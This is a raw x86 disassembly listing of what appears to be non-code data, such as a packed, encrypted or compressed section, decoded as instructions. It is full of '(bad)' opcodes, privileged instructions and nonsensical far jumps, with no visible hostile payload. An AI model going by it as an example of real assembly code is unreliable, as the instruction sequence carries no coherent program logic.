  42438b:	add    DWORD PTR [ecx+0xda3d1b],edx
	...
  4243f1:	add    BYTE PTR [eax],al
  4243f3:	add    BYTE PTR [edx-0x24582da],cl
  4243f9:	sti    
  4243fa:	iret   
  4243fb:	ss aam 0xb
  4243fe:	push   ss
  4243ff:	jno    0x42438b
  424401:	add    eax,0x8294e827
  424406:	add    DWORD PTR [eax],eax
  424408:	add    al,0x1
  42440a:	add    BYTE PTR [eax],al
  42440c:	fidiv  WORD PTR [edx]
  42440e:	xor    al,BYTE PTR [ebx+0x95d7395]
  424414:	in     eax,0xa9
  424416:	sti    
  424417:	xchg   ebp,eax
  424418:	add    eax,0x150f3a49
  42441d:	mov    edx,0x63e569
  424422:	or     BYTE PTR [edx-0x403417d7],ch
  424428:	mov    edi,DWORD PTR [esi+ebp*2-0x59]
  42442c:	call   0xd6aa3b47
  424431:	lock mov BYTE PTR [edi-0x16],dh
  424435:	clc    
  424436:	ss xor eax,ecx
  424439:	jg     0x42442c
  42443b:	sub    al,0xed
  42443d:	adc    al,0x9e
  42443f:	cdq    
  424440:	cmp    eax,0xf973f7aa
  424445:	(bad)  
  424447:	xchg   esp,eax
  424448:	cmp    al,0x33
  42444a:	(bad)  
  42444b:	in     eax,0x62
  42444d:	cmp    ebx,ebx
  42444f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424450:	pop    ebx
  424451:	ficomp WORD PTR [ecx-0x27]
  424454:	jno    0x4244d4
  424456:	imul   BYTE PTR ds:0x1e0684bd
  42445c:	lods   al,BYTE PTR ds:[esi]
  42445d:	imul   esi,DWORD PTR [ebx],0x4d18f7cb
  424463:	jle    0x424482
  424465:	retf   
  424466:	mov    ecx,cs
  424468:	xor    eax,0xd9ca385
  42446d:	je     0x4244bf
  42446f:	or     cl,al
  424471:	(bad)  
  424472:	std    
  424473:	inc    ebp
  424474:	mov    edi,0x8db2bbdb
  424479:	popa   
  42447a:	xchg   al,cl
  42447c:	sbb    esp,ecx
  42447e:	push   esi
  42447f:	inc    edx
  424480:	or     eax,0xbe114f52
  424485:	sub    edi,ebp
  424487:	in     eax,0x2f
  424489:	cmp    al,0x5
  42448b:	jmp    0x5541:0xfd63ab89
  424492:	lock leave 
  424494:	and    DWORD PTR [esi],ebp
  424496:	push   cs
  424497:	add    dl,BYTE PTR [ebp-0x4e24d27]
  42449d:	cwde   
  42449e:	retf   
  42449f:	lock push edi
  4244a1:	lds    eax,FWORD PTR [ebp+0x501de06]
  4244a7:	inc    esp
  4244a8:	outs   dx,DWORD PTR ds:[esi]
  4244a9:	(bad)  
  4244aa:	mov    esp,0x95f8a406
  4244af:	adc    DWORD PTR [ebx-0x48db789],0xa14e4f65
  4244b9:	test   ecx,esi
  4244bb:	lock and DWORD PTR [ebx-0x68],ebp
  4244bf:	mov    edi,0x715f0954
  4244c4:	adc    al,0xd7
  4244c6:	mov    BYTE PTR [eax-0x747b9a0f],cl
  4244cc:	hlt    
  4244cd:	cmc    
  4244ce:	jnp    0x4244fe
  4244d0:	sub    BYTE PTR [edi+0x7fcde509],dl
  4244d6:	ds aas 
  4244d8:	dec    eax
  4244d9:	push   esi
  4244da:	pop    eax
  4244db:	inc    ebp
  4244dc:	data16 (bad) 
  4244de:	leave  
  4244df:	and    BYTE PTR [ebx+edx*8-0x796ba960],dh
  4244e6:	adc    DWORD PTR [eax],edi
  4244e8:	scas   eax,DWORD PTR es:[edi]
  4244e9:	stos   BYTE PTR es:[edi],al
  4244ea:	mov    dl,0xa7
  4244ec:	out    dx,eax
  4244ed:	rcr    DWORD PTR [ebp-0x62f4c7a0],cl
  4244f3:	fdivr  st(0),st
  4244f5:	in     eax,0xe4
  4244f7:	cld    
  4244f8:	xchg   ebx,eax
  4244f9:	fistp  WORD PTR [ecx+0x29]
  4244fc:	js     0x4244a5
  4244fe:	inc    ebp
  4244ff:	xor    bh,BYTE PTR [edi+0x72f603a]
  424505:	sbb    BYTE PTR [edi],ch
  424507:	std    
  424508:	call   FWORD PTR [eax+0x3abbd6e]
  42450e:	loopne 0x42456e
	...
  424574:	loopne 0x4245e5
  424576:	xchg   esi,eax
  424577:	inc    edx
  424578:	lahf   
  424579:	sti    
  42457a:	hlt    
  42457b:	out    dx,eax
  42457c:	dec    eax
  42457d:	rol    DWORD PTR [esp+ebx*4-0x33],1
  424581:	jo     0x424555
  424583:	or     ebx,DWORD PTR [eax+0x4000183]
  424589:	add    DWORD PTR [eax],eax
  42458b:	add    BYTE PTR [esi+ebx*1-0x75],bh
  42458f:	adc    DWORD PTR [edi+0x38],edx
  424592:	mov    ebp,0x2d2507f0
  424597:	cmc    
  424598:	rol    edx,cl
  42459a:	test   eax,0x3a5c6bd8
  42459f:	and    al,0xbc
  4245a1:	xlat   BYTE PTR ds:[ebx]
  4245a2:	inc    eax
  4245a3:	or     DWORD PTR [ebp-0x52],edx
  4245a6:	pop    eax
  4245a7:	push   ss
  4245a8:	mov    ebx,0x36cfe2d8
  4245ad:	into   
  4245ae:	push   es
  4245af:	rol    BYTE PTR [ecx+0x75],1
  4245b2:	loopne 0x4245c8
  4245b4:	ins    BYTE PTR es:[edi],dx
  4245b5:	mov    al,ds:0x56a9fbe2
  4245ba:	dec    eax
  4245bb:	jns    0x424606
  4245bd:	adc    edx,DWORD PTR [edx+0x5]
  4245c0:	cmp    BYTE PTR [ebx-0x7f7f8b51],cl
  4245c6:	rol    BYTE PTR [eax-0x7a],0xad
  4245ca:	xor    BYTE PTR ds:0xa3c3b3b5,ch
  4245d0:	cwde   
  4245d1:	jmp    0xef96:0xe75cc78a
  4245d8:	or     eax,0xff974870
  4245dd:	cmp    ebp,ebp
  4245df:	mov    ecx,0x33c3f374
  4245e4:	dec    esi
  4245e5:	sbb    DWORD PTR [eax-0x42d28eec],ebx
  4245eb:	ins    DWORD PTR es:[edi],dx
  4245ec:	dec    edi
  4245ed:	xor    dh,BYTE PTR [ebp+0x6a]
  4245f0:	(bad)  
  4245f1:	pusha  
  4245f2:	xchg   DWORD PTR [edi-0x1531c92a],esi
  4245f8:	div    DWORD PTR [eax]
  4245fa:	or     esp,esi
  4245fc:	add    cl,0x96
  4245ff:	fwait
  424600:	pop    esi
  424601:	fidiv  DWORD PTR [esp+esi*2]
  424604:	jmp    0x1e2d:0xcf79573f
  42460b:	jle    0x42460a
  42460d:	rcl    DWORD PTR [edi],1
  42460f:	xchg   esi,eax
  424610:	test   al,0x73
  424612:	jmp    0x42466a
  424614:	add    eax,0x7de2b626
  424619:	ret    
  42461a:	mov    esp,0x6e424e36
  42461f:	xor    al,0xf0
  424621:	addr16 jns 0x4245b1
  424624:	stos   DWORD PTR es:[edi],eax
  424625:	mov    eax,ds:0xc4765532
  42462a:	adc    DWORD PTR [edx+0x1e036be5],0xffffffe0
  424631:	push   cs
  424632:	push   cs
  424633:	cs xchg edx,eax
  424635:	in     al,0xbe
  424637:	jbe    0x424648
  424639:	lds    esi,FWORD PTR [eax+0xed39755]
  42463f:	mov    eax,ds:0x94d004a1
  424644:	shl    BYTE PTR [ebp-0x54],0xf1
  424648:	pop    ecx
  424649:	outs   dx,BYTE PTR ds:[esi]
  42464a:	imul   ecx,DWORD PTR [ebx+ebp*2+0x1a],0x6ac69bf9
  424652:	mov    DWORD PTR [esi-0x55229ce6],edi
  424658:	push   es
  424659:	bound  ebp,QWORD PTR [ebx-0x2116071]
  42465f:	inc    ebx
  424660:	adc    ebx,0x889264b9
  424666:	pop    ss
  424667:	iret   
  424668:	call   DWORD PTR [edx-0x67]
  42466b:	mov    esp,0x1879710f
  424670:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424671:	in     al,dx
  424672:	xor    BYTE PTR [ebx-0x56],ah
  424675:	jb     0x424696
  424677:	push   ebx
  424678:	(bad)  
  424679:	xchg   edi,eax
  42467a:	sub    DWORD PTR [edx+0x471ff8c8],esi
  424680:	mov    eax,ds:0x536f9931
  424685:	adc    cl,0x3e
  424688:	enter  0xfe16,0x83
  42468c:	push   eax
  42468d:	inc    esp
  42468e:	int3   
  42468f:	loope  0x424691
	...
  4246f1:	add    BYTE PTR [eax],al
  4246f3:	add    BYTE PTR [edx+edx*4-0x10004],bh
  4246fa:	mov    edi,0xb298dbd3
  4246ff:	mov    BYTE PTR [ecx],ah
  424701:	mov    ch,0xce
  424703:	rcr    BYTE PTR [esp+eax*4+0x1040001],cl
  42470a:	add    BYTE PTR [eax],al
  42470c:	mov    DWORD PTR [edi],esi
  42470e:	lds    edx,FWORD PTR [edx+0xc3801e1]
  424714:	addr16 jno 0x4246a3
  424717:	jg     0x424785
  424719:	sub    DWORD PTR [edi+0x4a],0xddb13f68
  424720:	ficomp DWORD PTR [ecx-0x7f9c2a5f]
  424726:	jae    0x4246b6
  424728:	pop    ebx
  424729:	pop    ss
  42472a:	inc    BYTE PTR ds:[edi-0x75]
  42472e:	sbb    ch,al
  424730:	sti    
  424731:	imul   eax,esp,0xffffffd2
  424734:	cmp    al,0xe4
  424736:	mov    ah,0xe5
  424738:	xor    al,0xd0
  42473a:	mov    esi,0x43db3cff
  42473f:	mov    dh,BYTE PTR [edx]
  424741:	out    dx,eax
  424742:	mov    eax,ds:0xa189528
  424747:	mov    esi,0x3772dae7
  42474c:	inc    ecx
  42474d:	pop    ds
  42474e:	test   DWORD PTR [edi-0x4ca87abe],esi
  424754:	iret   
  424755:	xchg   edi,ebx
  424757:	push   es
  424758:	lds    eax,FWORD PTR [esi-0x68]
  42475b:	mov    bh,0xff
  42475d:	ret    0xb3f4
  424760:	adc    al,0x2f
  424762:	push   0xffffff89
  424764:	mov    ah,0xcb
  424766:	mov    al,0x2b
  424768:	or     BYTE PTR [edx],bl
  42476a:	cld    
  42476b:	ret    0xc700
  42476e:	mov    dl,0xa9
  424770:	sbb    BYTE PTR [ebx+0x8a8a18d],dh
  424776:	int    0x14
  424778:	cs xor ah,cl
  42477b:	mov    ecx,0xa390b712
  424780:	dec    esp
  424781:	stos   DWORD PTR es:[edi],eax
  424782:	shl    bh,0x67
  424785:	popa   
  424786:	lock (bad) 
  424788:	sub    eax,0x5d71d6a1
  42478d:	daa    
  42478e:	scas   eax,DWORD PTR es:[edi]
  42478f:	fwait
  424790:	fwait
  424791:	leave  
  424792:	cld    
  424793:	in     eax,0x36
  424795:	popa   
  424796:	cwde   
  424797:	push   ecx
  424798:	sbb    al,0x74
  42479a:	leave  
  42479b:	jle    0x42480b
  42479d:	inc    ebp
  42479e:	(bad)  
  4247a0:	mov    dh,0xbf
  4247a2:	test   DWORD PTR [edx],ecx
  4247a4:	sub    dl,BYTE PTR [ecx]
  4247a6:	or     al,0x98
  4247a8:	and    eax,0x389c9255
  4247ad:	les    ebp,FWORD PTR [edi]
  4247af:	and    edx,0x39f26c99
  4247b5:	les    eax,FWORD PTR [edi]
  4247b7:	jp     0x424771
  4247b9:	pusha  
  4247ba:	or     eax,0x83cf6b40
  4247bf:	das    
  4247c0:	das    
  4247c1:	mov    gs,WORD PTR [esi-0x28]
  4247c4:	xor    al,0x73
  4247c6:	sub    esi,DWORD PTR [eax+eax*4]
  4247c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4247ca:	push   eax
  4247cb:	or     al,0x8a
  4247cd:	and    eax,0xffd3d31f
  4247d2:	jge    0x424829
  4247d4:	adc    eax,ecx
  4247d6:	ret    0x2f35
  4247d9:	or     eax,0xccf67d5d
  4247de:	addr16 dec edx
  4247e0:	pop    esp
  4247e1:	imul   ebp,ebx,0x3979a95
  4247e7:	mov    ebx,0x62f5b775
  4247ec:	or     ebp,DWORD PTR [edx+0x2e]
  4247ef:	scas   eax,DWORD PTR es:[edi]
  4247f0:	inc    edx
  4247f1:	std    
  4247f2:	cmp    al,0x3
  4247f4:	xlat   BYTE PTR ds:[ebx]
  4247f5:	sbb    BYTE PTR [edi],ch
  4247f7:	mov    dh,0xf1
  4247f9:	xlat   BYTE PTR ds:[ebx]
  4247fa:	inc    ecx
  4247fb:	xor    eax,0x91c4da72
  424800:	les    ebx,FWORD PTR [ebx-0x32bbde08]
  424806:	mov    ch,0xbd
  424808:	push   ss
  424809:	mov    ecx,0x99995192
  42480e:	shl    edi,cl
	...
  424874:	and    bl,BYTE PTR [eax-0x7c]
  424877:	out    dx,eax
  424878:	(bad)  
  424879:	jmp    FWORD PTR [ebx-0x23]
  42487c:	lock test BYTE PTR [ebx],dl
  42487f:	xchg   esp,eax
  424880:	adc    BYTE PTR [esp+esi*8+0x185a05c],dh
  424887:	add    BYTE PTR [ecx+eax*1],al
  42488a:	add    BYTE PTR [eax],al
  42488c:	adc    edx,DWORD PTR [ecx+0x7c92dac]
  424892:	add    dh,BYTE PTR ds:0xcde5ab37
  424898:	add    DWORD PTR [eax+eax*1+0x7bdc9547],esp
  42489f:	(bad)  
  4248a0:	addr16 call 0xecbabc1c
  4248a6:	loop   0x424871
  4248a8:	sub    esi,edi
  4248aa:	pop    edi
  4248ab:	xchg   ebp,eax
  4248ac:	mov    eax,0x4befad6f
  4248b1:	mov    edi,0x74fa0ffa
  4248b6:	cmp    eax,0x99c730f0
  4248bb:	outs   dx,DWORD PTR ds:[esi]
  4248bc:	cs push ecx
  4248be:	inc    ebx
  4248bf:	inc    edx
  4248c0:	rcl    DWORD PTR ds:0x36afc408,cl
  4248c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248c7:	pop    eax
  4248c8:	xchg   esp,eax
  4248c9:	pop    ecx
  4248ca:	fmul   st(6),st
  4248cc:	inc    edi
  4248cd:	into   
  4248ce:	xchg   esi,eax
  4248cf:	pusha  
  4248d0:	ds and eax,0xfb58e26e
  4248d6:	sub    BYTE PTR [edx+0x6037069a],cl
  4248dc:	loopne 0x424909
  4248de:	js     0x4248e4
  4248e0:	mov    ebx,0xf45122e8
  4248e5:	and    bl,BYTE PTR [ebx+eax*1-0x1b]
  4248e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4248ea:	dec    esi
  4248eb:	sti    
  4248ec:	(bad)  
  4248ed:	in     al,dx
  4248ee:	cmp    cl,ch
  4248f0:	stos   BYTE PTR es:[edi],al
  4248f1:	jmp    0xd21b:0x2c6cff8b
  4248f8:	mov    ebp,0x7a3ec6e5
  4248fd:	jge    0x424937
  4248ff:	je     0x424958
  424901:	pop    eax
  424902:	ret    
  424903:	pop    esi
  424904:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424905:	inc    edi
  424906:	lods   eax,DWORD PTR ds:[esi]
  424907:	push   ss
  424908:	jmp    DWORD PTR [ecx-0x11ad93a6]
  42490e:	cld    
  42490f:	sti    
  424910:	sub    DWORD PTR [ebp+0x36],ebp
  424913:	add    bh,0x3a
  424916:	es jb  0x424949
  424919:	adc    edx,DWORD PTR ds:0xa9d70b9c
  42491f:	in     al,0x52
  424921:	pop    ds
  424922:	sbb    esi,ebx
  424924:	dec    esp
  424925:	pushf  
  424926:	cmp    dl,dh
  424928:	(bad)  
  424929:	jecxz  0x424958
  42492b:	inc    eax
  42492c:	xchg   esp,eax
  42492d:	iret   
  42492e:	es repnz dec edx
  424931:	jne    0x424930
  424933:	ss jle 0x4248fa
  424936:	pop    ss
  424937:	dec    esp
  424938:	lods   al,BYTE PTR ds:[esi]
  424939:	aad    0x17
  42493b:	push   esi
  42493c:	std    
  42493d:	mov    edi,0x973dc010
  424943:	lds    edi,FWORD PTR [esi-0x28a5c5f9]
  424949:	pop    ds
  42494a:	enter  0x567b,0xf0
  42494e:	(bad)  
  42494f:	jmp    0xf8e2:0x547832b0
  424956:	cmp    ah,BYTE PTR [ebp+0x5b77f790]
  42495c:	rol    BYTE PTR [eax-0xa],1
  42495f:	in     eax,dx
  424960:	xchg   BYTE PTR [ebx+0xd502ad2],al
  424966:	stos   BYTE PTR es:[edi],al
  424967:	not    DWORD PTR [edi+0x62feafa8]
  42496d:	dec    DWORD PTR [ebp+0x54cc7930]
  424973:	pop    ecx
  424974:	imul   edx,ebx,0x42666350
  42497a:	pop    edi
  42497b:	push   ss
  42497c:	imul   edx,DWORD PTR [esi],0x31
  42497f:	jecxz  0x424994
  424981:	lahf   
  424982:	imul   ebp,ebp,0xffffffd7
  424985:	cmp    al,0x28
  424987:	or     DWORD PTR [ebx-0x7e5c4a2d],eax
  42498d:	into   
  42498e:	jns    0x424982
	...
  4249f4:	imul   ebx,DWORD PTR [eax],0x63
  4249f7:	push   0x73
  4249f9:	jnp    0x424a66
  4249fb:	sbb    DWORD PTR [eax-0x5c],ecx
  4249fe:	push   esi
  4249ff:	xor    bl,BYTE PTR [ebp+0x21]
  424a02:	xchg   edi,eax
  424a03:	(bad)  
  424a04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a05:	xchg   BYTE PTR [ecx],al
  424a07:	add    BYTE PTR [ecx+eax*1],al
  424a0a:	add    BYTE PTR [eax],al
  424a0c:	aaa    
  424a0d:	dec    eax
  424a0e:	sbb    ebp,DWORD PTR [ebx]
  424a10:	mov    esp,0x32fd0f14
  424a15:	adc    bh,BYTE PTR [edi]
  424a17:	jo     0x4249e1
  424a19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a1a:	lea    esi,[edi+0x2b]
  424a1d:	jns    0x424a1b
  424a1f:	fild   QWORD PTR [esi-0x12]
  424a22:	fsub   DWORD PTR [eax]
  424a24:	test   ebx,0xea2a9c9b
  424a2a:	stos   BYTE PTR es:[edi],al
  424a2b:	push   ss
  424a2c:	xor    DWORD PTR [esi-0x318e6a06],edi
  424a32:	lahf   
  424a33:	test   eax,0x27f4a7cc
  424a38:	mov    DWORD PTR [ecx+0x59],ecx
  424a3b:	sub    al,0xe5
  424a3d:	imul   ebp,DWORD PTR [ecx-0x4f],0xffffffbf
  424a41:	and    ch,BYTE PTR [ebx]
  424a43:	push   ds
  424a44:	push   ss
  424a45:	sub    edx,DWORD PTR [ebx+ecx*2+0x4dc79bf1]
  424a4c:	inc    eax
  424a4d:	xlat   BYTE PTR ds:[ebx]
  424a4e:	hlt    
  424a4f:	fild   DWORD PTR [esi-0x58]
  424a52:	stc    
  424a53:	sar    DWORD PTR [ebx+0x1c669f5],1
  424a59:	mov    dh,BYTE PTR [esi]
  424a5b:	jge    0x424a00
  424a5d:	xlat   BYTE PTR ds:[ebx]
  424a5e:	fimul  WORD PTR [ebp-0x7a]
  424a61:	test   eax,0x2920c6ac
  424a66:	shl    DWORD PTR [eax-0x4ab6f85c],0x1e
  424a6d:	call   0x2286:0x853a81ce
  424a74:	jns    0x424ac5
  424a76:	aas    
  424a77:	mov    edi,0xacefc01d
  424a7c:	(bad)  
  424a7d:	mov    esp,0x5e766593
  424a82:	sahf   
  424a83:	leave  
  424a84:	mov    ebp,0xf3945b33
  424a89:	and    edx,DWORD PTR [ecx-0x3e5dab5d]
  424a8f:	into   
  424a90:	push   ebx
  424a91:	jg     0x424a57
  424a93:	and    esi,ecx
  424a95:	jne    0x424b06
  424a97:	pop    eax
  424a98:	cmp    cl,BYTE PTR [esi+0x1e]
  424a9b:	imul   ecx,DWORD PTR [eax+ebx*1+0xfaa0f96],0xff2a266d
  424aa6:	add    esp,DWORD PTR [edx+0x5c4733e9]
  424aac:	imul   esi,DWORD PTR [edx+0x2faf70d2],0x5e
  424ab3:	push   edi
  424ab4:	and    cl,BYTE PTR [edi-0x7b]
  424ab7:	sbb    ah,dl
  424ab9:	xchg   DWORD PTR [ecx-0x1b8bda3c],edx
  424abf:	dec    ebx
  424ac0:	loope  0x424a9f
  424ac2:	outs   dx,BYTE PTR ds:[esi]
  424ac3:	fstp   QWORD PTR [ebp-0x4cc9b39d]
  424ac9:	iret   
  424aca:	cld    
  424acb:	(bad)  
  424acd:	sub    BYTE PTR [ecx-0x5d],ch
  424ad0:	mov    cl,BYTE PTR [ebx+0x4]
  424ad3:	jae    0x424b32
  424ad5:	test   DWORD PTR [esi-0x7ad859ca],0x872e61ea
  424adf:	push   es
  424ae0:	cmp    eax,0x31e22e6f
  424ae5:	mov    cl,bl
  424ae7:	xor    al,0x17
  424ae9:	retf   
  424aea:	lds    esp,FWORD PTR [esi-0x70]
  424aed:	xor    DWORD PTR [esi],0xf9b15ee5
  424af3:	ret    
  424af4:	jo     0x424b73
  424af6:	ins    BYTE PTR es:[edi],dx
  424af7:	mov    ah,0x3a
  424af9:	jmp    0x424aa5
  424afb:	dec    ch
  424afd:	(bad)  
  424afe:	stos   BYTE PTR es:[edi],al
  424aff:	aas    
  424b00:	int3   
  424b01:	imul   ecx,esi,0xffffff83
  424b04:	mov    bl,BYTE PTR [ecx+edx*1-0x2bf92057]
  424b0b:	pop    edi
  424b0c:	sub    al,0x68
  424b0e:	rol    BYTE PTR [ecx+0x0],cl
	...
  424b71:	add    BYTE PTR [eax],al
  424b73:	add    BYTE PTR [esi],al
  424b75:	aas    
  424b76:	or     eax,0xb6bb3db9
  424b7b:	mov    edi,0xdc50081e
  424b80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b81:	push   ss
  424b82:	mov    dh,0xa1
  424b84:	test   al,0x87
  424b86:	add    DWORD PTR [eax],eax
  424b88:	add    al,0x1
  424b8a:	add    BYTE PTR [eax],al
  424b8c:	jns    0x424b85
  424b8e:	les    ebp,FWORD PTR [eax-0x5c8d44b9]
  424b94:	sbb    al,BYTE PTR [ecx-0x180cee5b]
  424b9a:	xchg   DWORD PTR [edx],ecx
  424b9c:	ror    DWORD PTR [ecx+0x609cea3c],1
  424ba2:	add    edi,DWORD PTR [esi+0x248fd03f]
  424ba8:	jge    0x424c14
  424baa:	and    DWORD PTR [esi-0x1f1d6933],esp
  424bb0:	(bad)  
  424bb1:	mov    bl,0x78
  424bb3:	jb     0x424b5e
  424bb5:	or     esi,DWORD PTR [ecx+0x64]
  424bb8:	push   ebp
  424bb9:	jo     0x424bec
  424bbb:	je     0x424b46
  424bbd:	add    al,0xff
  424bbf:	call   0x1b16e42c
  424bc4:	sbb    DWORD PTR [edi+eax*4+0x79461e07],eax
  424bcb:	stos   BYTE PTR es:[edi],al
  424bcc:	add    BYTE PTR [ebp+0x72],dh
  424bcf:	or     esi,edx
  424bd1:	call   0x4a7739e2
  424bd6:	rcr    edi,0x3d
  424bd9:	dec    edx
  424bda:	or     eax,ecx
  424bdc:	mov    ecx,0x7bd078e
  424be1:	add    BYTE PTR [ecx+0x4148d70b],dh
  424be7:	dec    ebx
  424be8:	sbb    al,0xa5
  424bea:	shr    eax,1
  424bec:	mov    ecx,0xead27082
  424bf1:	jge    0x424c67
  424bf3:	out    dx,eax
  424bf4:	icebp  
  424bf5:	dec    ebx
  424bf6:	and    bl,BYTE PTR [edi]
  424bf8:	pop    edx
  424bf9:	cdq    
  424bfa:	leave  
  424bfb:	adc    BYTE PTR [ebp-0xa74b01c],bl
  424c01:	popa   
  424c02:	mov    bh,0x2c
  424c04:	and    DWORD PTR [ebp+0x24],edx
  424c07:	push   0xffffff92
  424c09:	inc    edx
  424c0a:	lods   al,BYTE PTR ds:[esi]
  424c0b:	xchg   ebx,eax
  424c0c:	ret    
  424c0d:	stos   DWORD PTR es:[edi],eax
  424c0e:	pop    esp
  424c0f:	jo     0x424b93
  424c11:	mov    al,0x21
  424c13:	data16 jno 0x424c33
  424c16:	or     DWORD PTR [eax+0x3c],0xc60782ad
  424c1d:	sahf   
  424c1e:	cmp    al,0x32
  424c20:	clc    
  424c21:	ins    DWORD PTR es:[edi],dx
  424c22:	hlt    
  424c23:	mov    ch,0xff
  424c25:	mov    edx,0xa0f6f802
  424c2a:	(bad)  
  424c2b:	mov    bl,0x7f
  424c2d:	xor    dx,0xc350
  424c32:	add    al,0x39
  424c34:	jl     0x424bc7
  424c36:	xlat   BYTE PTR ds:[ebx]
  424c37:	sub    al,0xc9
  424c39:	in     eax,dx
  424c3a:	stos   BYTE PTR es:[edi],al
  424c3b:	fdivr  QWORD PTR [ebp+0x40]
  424c3e:	mov    WORD PTR [esi],ss
  424c40:	inc    eax
  424c41:	xchg   ecx,eax
  424c42:	mov    edx,0x206414b4
  424c47:	push   ebx
  424c48:	lds    esi,FWORD PTR [ecx]
  424c4a:	jb     0x424c9b
  424c4c:	push   cs
  424c4d:	int    0x21
  424c4f:	mov    ds:0x17165f4f,al
  424c54:	imul   eax,DWORD PTR [esi-0x3],0x5e
  424c58:	push   ebx
  424c59:	xchg   ecx,eax
  424c5a:	mov    ebp,0x9ba1e582
  424c5f:	fs cdq 
  424c61:	mul    BYTE PTR [ecx+0x70]
  424c64:	in     eax,0x3a
  424c66:	or     ch,BYTE PTR [ebp-0x164c7c8c]
  424c6c:	hlt    
  424c6d:	add    ah,BYTE PTR [edi+0x35]
  424c70:	adc    al,0x19
  424c72:	shl    BYTE PTR [ecx-0x58160b04],cl
  424c78:	add    esp,DWORD PTR [ecx+0x7b57604]
  424c7e:	(bad)  
  424c7f:	cli    
  424c80:	stos   BYTE PTR es:[edi],al
  424c81:	loope  0x424cfc
  424c83:	xor    eax,0x3c0e3493
  424c88:	push   ebp
  424c89:	daa    
  424c8a:	xor    BYTE PTR [ecx+0x30f1d694],cl
	...
  424cf4:	ins    BYTE PTR es:[edi],dx
  424cf5:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  424cfc:	bound  ebx,QWORD PTR [ebx-0x2159ae58]
  424d02:	jno    0x424cbe
  424d04:	lods   al,BYTE PTR ds:[esi]
  424d05:	mov    BYTE PTR [ecx],al
  424d07:	add    BYTE PTR [ecx+eax*1],al
  424d0a:	add    BYTE PTR [eax],al
  424d0c:	sbb    eax,0xf17602c2
  424d11:	inc    ecx
  424d12:	int    0x46
  424d14:	retf   
  424d15:	inc    esp
  424d16:	mov    eax,ds:0xbafd3828
  424d1b:	gs fwait
  424d1d:	shr    DWORD PTR [esi],0xbf
  424d20:	retf   
  424d21:	xchg   ebp,eax
  424d22:	add    al,BYTE PTR [ecx+0x1f]
  424d25:	mov    edx,DWORD PTR [eax]
  424d27:	jle    0x424d16
  424d29:	mov    BYTE PTR ds:0x8e94fd69,bl
  424d2f:	call   0xd49d0e1
  424d34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424d35:	rol    DWORD PTR ds:0xbbe40899,cl
  424d3b:	rol    BYTE PTR ss:[edi-0x30],0xab
  424d40:	cmp    al,0x6b
  424d42:	popa   
  424d43:	js     0x424d29
  424d45:	jl     0x424dad
  424d47:	in     eax,dx
  424d48:	clc    
  424d49:	mov    ds:0x524397ae,eax
  424d4e:	cmp    eax,0x5b5084b6
  424d53:	xchg   edi,eax
  424d54:	stc    
  424d55:	test   BYTE PTR [ecx-0x24],dl
  424d58:	aas    
  424d59:	xchg   esi,eax
  424d5a:	pop    edx
  424d5b:	lea    ecx,[edi]
  424d5d:	retf   0xf1db
  424d60:	jmp    0xcfc9:0xeb8b8123
  424d67:	or     ah,BYTE PTR [ebx-0x1105e9b8]
  424d6d:	imul   ebp,DWORD PTR [ebp-0x18a7bfdb],0x46
  424d74:	ja     0x424d4f
  424d76:	mov    DWORD PTR [ecx-0x25147730],ebp
  424d7c:	mov    al,BYTE PTR [ecx]
  424d7e:	arpl   WORD PTR [edx],di
  424d80:	cmp    al,BYTE PTR [ecx-0xe]
  424d83:	pop    ebp
  424d84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424d85:	jecxz  0x424d5c
  424d87:	dec    esp
  424d88:	add    eax,0xd9842524
  424d8d:	inc    edi
  424d8e:	inc    ecx
  424d8f:	mov    ebp,DWORD PTR [edi]
  424d91:	xor    cl,BYTE PTR [esi-0x7b]
  424d94:	cmp    al,0xa9
  424d96:	inc    ebx
  424d97:	and    al,0x2c
  424d99:	test   al,0xcf
  424d9b:	arpl   WORD PTR [ebx-0xbb77fbe],dx
  424da1:	repz push esp
  424da3:	xor    BYTE PTR [esi],al
  424da5:	xor    al,0x3d
  424da7:	ficomp DWORD PTR [edx-0x62af1006]
  424dad:	jg     0x424d30
  424daf:	sar    BYTE PTR [edx+0x16],0xe3
  424db3:	hlt    
  424db4:	or     DWORD PTR [esi],esi
  424db6:	pop    esp
  424db7:	jg     0x424e17
  424db9:	ds cs mov bh,0x1c
  424dbd:	sbb    al,0xc4
  424dbf:	and    ebx,DWORD PTR ds:0x34c8a469
  424dc5:	in     eax,dx
  424dc6:	sbb    esp,esp
  424dc8:	arpl   WORD PTR [edx-0x7b],cx
  424dcb:	in     eax,dx
  424dcc:	sub    eax,0xe2c9475d
  424dd1:	lea    esp,[edx]
  424dd3:	stos   DWORD PTR es:[edi],eax
  424dd4:	in     al,dx
  424dd5:	pop    ss
  424dd6:	(bad)  
  424dd8:	icebp  
  424dd9:	push   ebx
  424dda:	cwde   
  424ddb:	rcl    BYTE PTR [eax],0xc4
  424dde:	(bad)  
  424ddf:	fcomp  st(4)
  424de1:	sbb    al,0xf
  424de3:	xor    bl,BYTE PTR [edi]
  424de5:	jno    0x424e2d
  424de7:	adc    DWORD PTR [esi],esp
  424de9:	mov    edi,edi
  424deb:	lahf   
  424dec:	adc    DWORD PTR [ebx-0x37],esi
  424def:	fcom   QWORD PTR [ecx]
  424df1:	std    
  424df2:	shr    BYTE PTR [edi-0x2d],1
  424df5:	xchg   esp,eax
  424df6:	dec    eax
  424df7:	mov    eax,ds:0xba20965f
  424dfc:	loop   0x424e14
  424dfe:	mov    dh,0xb4
  424e00:	mov    edi,ecx
  424e02:	imul   ecx,esp,0x3e
  424e05:	sbb    DWORD PTR ds:0xaa0ce9f1,ecx
  424e0b:	rol    al,cl
  424e0d:	push   es
  424e0e:	popf   
  424e0f:	stc    
	...
  424e74:	cmp    eax,0xf361d20c
  424e79:	(bad)  
  424e7a:	mov    edi,0x4bceee5c
  424e7f:	jns    0x424ec2
  424e81:	clc    
